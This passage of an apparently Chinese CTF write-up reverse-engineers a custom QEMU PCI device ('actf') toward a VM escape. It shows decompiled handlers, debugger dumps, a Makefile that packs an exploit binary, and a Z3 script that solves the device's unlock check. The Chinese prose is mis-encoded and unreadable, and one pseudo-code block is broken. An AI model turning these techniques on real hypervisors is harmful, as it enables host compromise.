class="string">&quot;actf-pmio&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">1</span>, <span class="number">1u</span>, v3 + <span class="number">2960</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;writeï¼šrdiä¸€èˆ¬ä¸ºä¸€ä¸ªvoidç±»å‹æŒ‡é’ˆï¼Œä¸€èˆ¬ä¼šå¼ºè½¬ä¸ºè‡ªå®šä¹‰çš„PCIDeviceã€‚ä¸€ä¸ªbufferæ•°ç»„ï¼Œè¯»å†™4ä¸ªå­—èŠ‚ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)(opaque + addr + <span class="number">0xA38</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">actf_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">        *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pmio_read&#x2F;writeï¼Œwriteåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œå¯åŠ¨ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨è¿™é‡Œé‡å‘½åä¸º xxxxã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_pmio_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA31</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA30</span>);</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)v2[<span class="number">335</span>] + (addr &amp; <span class="number">0xF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">actf_pmio_write</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="built_in">off_11BB7F0</span>(v4 + <span class="number">405</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">116LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)v4 + <span class="number">0xA30</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">qemu_thread_create</span>((<span class="type">pthread_t</span> *)v4 + <span class="number">404</span>, (__int64)<span class="string">&quot;actf-worker-thread&quot;</span>, (__int64)sub_409F40, (__int64)v4, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">16</span> &lt;= <span class="number">0xF</span> &amp;&amp; *((_BYTE *)v4 + <span class="number">2609</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (__int64)v4[<span class="number">335</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="built_in">g_malloc</span>(<span class="number">32LL</span>);</span><br><span class="line">        v4[<span class="number">335</span>] = (<span class="type">const</span> <span class="type">char</span> ***)v9;</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(v9 + (addr &amp; <span class="number">0xF</span>)) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">qemu_mutex_unlock</span>((<span class="type">pthread_mutex_t</span> *)v4 + <span class="number">81</span>, (<span class="type">int</span>)<span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x8B</span>u, v5, v6, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ç›¸å…³é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:ac7f</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf1fff 0x0000000000040200</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>é‡æ–°æ‰“åŒ…cpioæ–‡ä»¶ï¼Œå°½é‡ä¸è¦†ç›–åŸæ¥çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬æ”¹ä¸ªåï¼Œä½¿ç”¨makefileè‡ªåŠ¨åŒ–</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAGS := -no-pie -static</span><br><span class="line">SRC := exp.c</span><br><span class="line">TARGET := exp</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(SRC)</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	strip <span class="variable">$@</span></span><br><span class="line">	find . | cpio -ov --format=newc  | gzip -9 &gt; ../rootfs.cpio.gz</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;writeï¼šè¯»å†™ 0xa38 é™„è¿‘çš„å†…å®¹0x0~0x44ï¼Œè¯»å–ä¸€ä¸‹ï¼Œæš‚æ—¶æ²¡å‘ç°æœ‰ç”¨çš„åœ°æ–¹ï¼ŒæŸ¥çœ‹pmio_read 0xa30åŒºåŸŸå’Œ ActfStateã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$rdi</span>+<span class="variable">$rsi</span>+0xa38</span><br><span class="line"><span class="variable">$3</span> = 0x56327d1bc568</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568</span><br><span class="line">00:0000â”‚  0x56327d1bc568 â—‚â€” 0x0</span><br><span class="line">... â†“     7 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38+0xa30</span><br><span class="line">00:0000â”‚  0x56327d1bc560 â—‚â€” 0x1234ac7f00000000</span><br><span class="line">01:0008â”‚  0x56327d1bc568 â—‚â€” 0x0</span><br><span class="line">... â†“     6 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38</span><br><span class="line">00:0000â”‚ rdi 0x56327d1bbb30 â€”â–¸ 0x56327c433850 â€”â–¸ 0x56327c1888d0 â€”â–¸ 0x56327c156b10 â—‚â€” 0x560066746361 /* <span class="string">&#x27;actf&#x27;</span> */</span><br><span class="line">01:0008â”‚     0x56327d1bbb38 â€”â–¸ 0x7ff383e92d50 (g_free) â—‚â€” endbr64</span><br><span class="line">02:0010â”‚     0x56327d1bbb40 â€”â–¸ 0x56327d1b86a0 â—‚â€” 0x8</span><br><span class="line">03:0018â”‚     0x56327d1bbb48 â—‚â€” 0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">04:0020â”‚     0x56327d1bbb50 â€”â–¸ 0x56327c437360 â€”â–¸ 0x56327c36b930 â€”â–¸ 0x56327c1d2260 â€”â–¸ 0x56327c1d23e0 â—‚â€” ...</span><br><span class="line">05:0028â”‚     0x56327d1bbb58 â—‚â€” 0x0</span><br><span class="line">06:0030â”‚     0x56327d1bbb60 â€”â–¸ 0x56327d1b9ef0 â—‚â€” <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line">07:0038â”‚     0x56327d1bbb68 â—‚â€” 0x1</span><br></pre></td></tr></table></figure>

<p>pmio_readæœ‰ä¸€ä¸ªéœ€è¦0xa31å¤„å€¼ä¸º1ï¼Œå› æ­¤éœ€è¦å…ˆè§£å†³ä¸€ä¸‹ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br></pre></td></tr></table></figure>

<p>åœ¨pmio_writeå¤„åˆ›å»ºçš„çº¿ç¨‹å¤„èµ‹å€¼ï¼ŒæŸäº›åç§»è¢«å¼ºåˆ¶ç±»å‹è½¬åŒ–äº†ï¼Œå› æ­¤éœ€è¦çœ‹æ±‡ç¼–ï¼Œå¹¶ä¸”è¿™é‡Œä½¿ç”¨128ä¸ºå¯„å­˜å™¨ã€‚å˜é‡é‡å‘½åğŸ˜¢</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_409F40</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> actfDW; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****_actfState; <span class="comment">// r10</span></span><br><span class="line">  __m128i *actfBuf0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> __m128i *actfBuf2; <span class="comment">// r11</span></span><br><span class="line">  __int64 *_stackBuf; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// r8d</span></span><br><span class="line">  __m128i *__actfBuf0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *__stackbuf; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> __m128i *_actfBuf2; <span class="comment">// rsi</span></span><br><span class="line">  __m128i actfBuf1; <span class="comment">// xmm2</span></span><br><span class="line">  <span class="type">char</span> byte1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// cl</span></span><br><span class="line">  __m128i ___actfBuf0; <span class="comment">// xmm5</span></span><br><span class="line">  __m128i _____actfBuf1; <span class="comment">// xmm6</span></span><br><span class="line">  __int128 v16; <span class="comment">// rax</span></span><br><span class="line">  __int128 v18; <span class="comment">// rax</span></span><br><span class="line">  __int128 stackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-98h] BYREF</span></span><br><span class="line">  __int64 endStackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-78h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+30h] [rbp-68h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+38h] [rbp-60h]</span></span><br><span class="line">  __m128i _actfBuf0; <span class="comment">// [rsp+40h] [rbp-58h] BYREF</span></span><br><span class="line">  __m128i ___actfBuf1; <span class="comment">// [rsp+50h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+68h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  actfDW = *((_DWORD *)actfState + <span class="number">0x28D</span>);      <span class="comment">// 0xa34: å€¼ä¸º0x1234ac7f</span></span><br><span class="line">  _actfState = actfState;</span><br><span class="line">  <span class="built_in">memset</span>(stackBuf, <span class="number">0</span>, <span class="built_in">sizeof</span>(stackBuf));</span><br><span class="line">  actfBuf0 = (__m128i *)(actfState + <span class="number">0x147</span>);    <span class="comment">// a38</span></span><br><span class="line">  actfBuf2 = (<span class="type">const</span> __m128i *)(actfState + <span class="number">0x14B</span>);<span class="comment">// a58</span></span><br><span class="line">  _stackBuf = (__int64 *)stackBuf;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)_stackBuf = actfDW;</span><br><span class="line">    _stackBuf = (__int64 *)((<span class="type">char</span> *)_stackBuf + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( _stackBuf != endStackBuf );           <span class="comment">// å¡«å…… 8 * 0x1234ac7f åˆ°æ ˆä¸Š</span></span><br><span class="line">  offset = -(<span class="type">int</span>)actfBuf2;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __actfBuf0 = &amp;_actfBuf0;</span><br><span class="line">    __stackbuf = (__int64 *)stackBuf;</span><br><span class="line">    _actfBuf2 = actfBuf2;</span><br><span class="line">    actfBuf1 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x149</span>));<span class="comment">// a48</span></span><br><span class="line">    _actfBuf0 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x147</span>));<span class="comment">// a38</span></span><br><span class="line">    ___actfBuf1 = actfBuf1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      byte1 = __actfBuf0-&gt;m128i_i8[<span class="number">0</span>] ^ _actfBuf2-&gt;m128i_i8[<span class="number">0</span>];</span><br><span class="line">      __stackbuf = (__int64 *)((<span class="type">char</span> *)__stackbuf + <span class="number">1</span>);</span><br><span class="line">      v13 = *((_BYTE *)__stackbuf - <span class="number">1</span>) ^ (offset + (_BYTE)_actfBuf2);<span class="comment">// stackBuf å•ä¸ªå­—èŠ‚ ^ 0,1,2...</span></span><br><span class="line">      _actfBuf2 = (<span class="type">const</span> __m128i *)((<span class="type">char</span> *)_actfBuf2 + <span class="number">1</span>);</span><br><span class="line">      __actfBuf0 = (__m128i *)((<span class="type">char</span> *)__actfBuf0 + <span class="number">1</span>);</span><br><span class="line">      *((_BYTE *)__stackbuf - <span class="number">1</span>) = v13;         <span class="comment">// stackBuf å¼‚æˆ–ç»“æœå†™å›stackBuf</span></span><br><span class="line">      __actfBuf0[<span class="number">-1</span>].m128i_i8[<span class="number">15</span>] = v13 ^ byte1;<span class="comment">// ä¿®æ”¹ actfBuf å†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( __stackbuf != endStackBuf );</span><br><span class="line">    ___actfBuf0 = _mm_load_si128(&amp;_actfBuf0);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(offset) = offset + <span class="number">0x11</span>;</span><br><span class="line">    _____actfBuf1 = _mm_load_si128(&amp;___actfBuf1);</span><br><span class="line">    *actfBuf0 = _mm_loadu_si128(actfBuf2);</span><br><span class="line">    actfBuf0[<span class="number">1</span>] = _mm_loadu_si128(actfBuf2 + <span class="number">1</span>);</span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">331</span>) = ___actfBuf0;<span class="comment">// a58</span></span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">333</span>) = _____actfBuf1;<span class="comment">// a68</span></span><br><span class="line">                                                <span class="comment">// swap æ“ä½œï¼Œa38 swap a58 0x20</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)offset != <span class="number">0xAA</span> - (_BYTE)actfBuf2 );<span class="comment">// 10æ¬¡å¾ªç¯</span></span><br><span class="line">  endStackBuf[<span class="number">0</span>] = <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">  *((_QWORD *)&amp;v16 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">327</span>] ^ <span class="number">0xABA29EC2A98DD89A</span>LL;<span class="comment">// a38</span></span><br><span class="line">  endStackBuf[<span class="number">1</span>] = <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;v16 = actfBuf0-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  v21 = <span class="number">0xFB92A48DB386FFA8</span>LL;</span><br><span class="line">  v22 = <span class="number">0xEFB491B8AFB4ABD3</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( v16 == <span class="number">0</span> &amp;&amp; !(v21 ^ actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0xEFB491B8AFB4ABD3</span>LL) )<span class="comment">// éƒ½ä¸º0ï¼Œå¯ä»¥æ¨å‡ºä¸Šä¸€æ­¥çš„actfBuf0çš„å€¼</span></span><br><span class="line">  &#123;</span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">0</span>] = <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">    *((_QWORD *)&amp;v18 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">331</span>] ^ <span class="number">0x80EF69F1CBD00397</span>LL;<span class="comment">// a58</span></span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">1</span>] = <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;v18 = actfBuf2-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">0</span>] = <span class="number">0xEC9E22F5A5A07FA3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">1</span>] = <span class="number">0x4B36DF7B5B655A84</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">0</span></span><br><span class="line">      &amp;&amp; !(___actfBuf1.m128i_i64[<span class="number">0</span>] ^ actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0x4B36DF7B5B655A84</span>LL) )<span class="comment">// æ¨å‡ºactfBuf2çš„å€¼</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)_actfState + <span class="number">0xA31</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)_actfState + <span class="number">0xA30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æå–å‡ºæœ€åçš„æ•°æ®</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">buf0<span class="number">-20</span> byte</span><br><span class="line"><span class="number">0xABA29EC2A98DD89A</span>LL</span><br><span class="line"><span class="number">0xBBF1B4AB81B4A9D4</span>LL</span><br><span class="line"><span class="number">0xFB92A48DB386FFA8</span>LL</span><br><span class="line"><span class="number">0xEFB491B8AFB4ABD3</span>LL</span><br><span class="line">buf2<span class="number">-20b</span>yte</span><br><span class="line"><span class="number">0x80EF69F1CBD00397</span>LL</span><br><span class="line"><span class="number">0xB2EB07859CDA52D3</span>LL</span><br><span class="line"><span class="number">0xEC9E22F5A5A07FA3</span>LL</span><br><span class="line"><span class="number">0x4B36DF7B5B655A84</span>LL</span><br></pre></td></tr></table></figure>

<p>ç®—æ³•ç®€åŒ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer0 = [?] * <span class="number">0x20</span></span><br><span class="line">buffer2 = [?] * <span class="number">0x20</span></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    b1 = buffer0[j] ^ buffer2[j]</span><br><span class="line">    b2 = stackBuf[j] ^ (i * <span class="number">0x11</span> + j) &amp; <span class="number">0xff</span>)</span><br><span class="line">    stackBuf[j] = b2</span><br><span class="line">    buffer0[j] = b1 ^ b2</span><br><span class="line">    buffer0, buffer2 = buffer2, buffer0</span><br></pre></td></tr></table></figure>

<p>å­¦ä¹ ä½¿ç”¨Z3-Solverè§£å¯†ï¼šSolver add çº¦æŸã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">buffer0 = [?] * 0x20</span></span><br><span class="line"><span class="string">buffer2 = [?] * 0x20</span></span><br><span class="line"><span class="string">stackBuf = [0x7f, 0xac, 0x34, 0x12] * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">  for j in range(32):</span></span><br><span class="line"><span class="string">    b1 = buffer0[j] ^ buffer2[j]</span></span><br><span class="line"><span class="string">    b2 = stackBuf[j] ^ (i * 0x11 + j) &amp; 0xff)</span></span><br><span class="line"><span class="string">    stackBuf[j] = b2</span></span><br><span class="line"><span class="string">    buffer0[j] = b1 ^ b2</span></span><br><span class="line"><span class="string">    buffer0, buffer2 = buffer2, buffer0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sol = Solver()</span><br><span class="line"></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line">buf = [BitVec(<span class="string">f&#x27;buf<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line">tmp = [BitVec(<span class="string">f&#x27;tmp<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line">order = buf.copy()  <span class="comment"># ä¸ºäº†ç»“æœæœ‰åº</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(buf[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    sol.add(buf[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">ans = [</span><br><span class="line">    <span class="number">0xABA29EC2A98DD89A</span>,</span><br><span class="line">    <span class="number">0xBBF1B4AB81B4A9D4</span>,</span><br><span class="line">    <span class="number">0xFB92A48DB386FFA8</span>,</span><br><span class="line">    <span class="number">0xEFB491B8AFB4ABD3</span>,</span><br><span class="line">    <span class="number">0x80EF69F1CBD00397</span>,</span><br><span class="line">    <span class="number">0xB2EB07859CDA52D3</span>,</span><br><span class="line">    <span class="number">0xEC9E22F5A5A07FA3</span>,</span><br><span class="line">    <span class="number">0x4B36DF7B5B655A84</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">byteans = <span class="string">b&#x27;&#x27;</span>.join([pack(<span class="string">&quot;&lt;Q&quot;</span>, num) <span class="keyword">for</span> num <span class="keyword">in</span> ans])</span><br><span class="line"><span class="comment"># print(byteans)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        b1 = buf[j] ^ buf[j + <span class="number">0x20</span>]</span><br><span class="line">        b2 = stackBuf[j] ^ ((j + <span class="number">0x11</span> * i) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        stackBuf[j] = b2</span><br><span class="line">        tmp[j] = b2 ^ b1  <span class="comment"># bufå‰20ä½</span></span><br><span class="line"></span><br><span class="line">    buf[:<span class="number">0x20</span>] = buf[<span class="number">0x20</span>:]</span><br><span class="line">    buf[<span class="number">0x20</span>:] = tmp[:<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(byteans) == <span class="number">0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(byteans[i] == buf[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> sol.check() == sat:</span><br><span class="line">    model = sol.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f&#x27;<span class="subst">&#123;model[i]&#125;</span>&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] no sol&quot;</span>)</span><br></pre></td></tr></table></figure>

